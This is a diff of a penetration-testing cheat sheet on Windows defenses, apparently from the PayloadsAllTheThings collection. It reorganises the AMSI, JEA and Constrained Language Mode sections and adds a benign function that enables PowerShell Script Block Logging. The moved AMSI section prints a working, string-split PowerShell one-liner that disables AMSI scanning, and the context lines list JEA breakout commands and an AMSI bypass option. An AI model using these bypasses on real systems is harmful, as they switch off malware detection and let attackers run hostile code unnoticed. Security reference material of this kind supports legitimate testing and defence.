@@ -2,25 +2,16 @@
 
 ## Summary
 
-* [AMSI](#amsi)
 * [AppLocker](#applocker)
 * [DPAPI](#dpapi)
 * [Powershell](#powershell)
-    * [JEA](#jea)
+    * [Anti Malware Scan Interface](#anti-malware-scan-interface)
+    * [Just Enough Administration](#just-enough-administration)
     * [Contrained Language Mode](#constrained-language-mode)
+    * [Script Block Logging](#script-block-logging)
 * [Windows Defender Antivirus](#windows-defender-antivirus)
 * [Windows Defender Application Control](#windows-defender-application-control)
 * [Windows Defender Firewall](#windows-defender-firewall)
-
-## AMSI
-
-> The Anti-Malware Scan Interface (AMSI) is a Windows API (Application Programming Interface) that provides a unified interface for applications and services to integrate with any anti-malware product installed on a system. The API allows anti-malware solutions to scan files and scripts at runtime, and provides a means for applications to request a scan of specific content.
-
-Find more AMSI bypass: [Windows - AMSI Bypass.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass.md)
-
-```powershell
-PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
-```
 
 
 ## AppLocker
@@ -48,7 +39,18 @@ Refer to [PayloadsAllTheThings/Windows - DPAPI.md](https://github.com/swisskyrep
 
 ## Powershell
 
-### JEA
+### Anti Malware Scan Interface
+
+> The Anti-Malware Scan Interface (AMSI) is a Windows API (Application Programming Interface) that provides a unified interface for applications and services to integrate with any anti-malware product installed on a system. The API allows anti-malware solutions to scan files and scripts at runtime, and provides a means for applications to request a scan of specific content.
+
+Find more AMSI bypass: [Windows - AMSI Bypass.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass.md)
+
+```powershell
+PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
+```
+
+
+### Just Enough Administration
 
 > Just-Enough-Administration (JEA) is a feature in Microsoft Windows Server that allows administrators to delegate specific administrative tasks to non-administrative users. JEA provides a secure and controlled way to grant limited, just-enough access to systems, while ensuring that the user cannot perform unintended actions or access sensitive information.
 
@@ -61,6 +63,7 @@ Breaking out if JEA:
     New-Service
     Add-Computer
     ```
+
 
 ### Constrained Language Mode
 
@@ -108,6 +111,29 @@ Check if we are in a constrained mode: `$ExecutionContext.SessionState.LanguageM
     rundll32 PowerShx.dll,main -s                           Attempt to bypass AMSI
     rundll32 PowerShx.dll,main -v                           Print Execution Output to the console
     ```
+
+
+### Script Block Logging
+
+> Once Script Block Logging is enabled, the script blocks and commands that are executed will be recorded in the Windows event log under the "Windows PowerShell" channel. To view the logs, administrators can use the Event Viewer application and navigate to the "Windows PowerShell" channel.
+
+Enable Script Block Loggin:
+
+```ps1
+function Enable-PSScriptBlockLogging
+{
+    $basePath = 'HKLM:\Software\Policies\Microsoft\Windows' +
+      '\PowerShell\ScriptBlockLogging'
+
+    if(-not (Test-Path $basePath))
+    {
+        $null = New-Item $basePath -Force
+    }
+
+    Set-ItemProperty $basePath -Name EnableScriptBlockLogging -Value "1"
+}
+```
+
 
 
 ## Windows Defender Antivirus
@@ -187,3 +213,4 @@ Also known as `WDAC/UMCI/Device Guard`.
 ## References
 
 * [SNEAKING PAST DEVICE GUARD - Cybereason - Philip Tsukerman](https://troopers.de/downloads/troopers19/TROOPERS19_AR_Sneaking_Past_Device_Guard.pdf)
+* [PowerShell about_Logging_Windows - Microsoft Documentation](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.3)
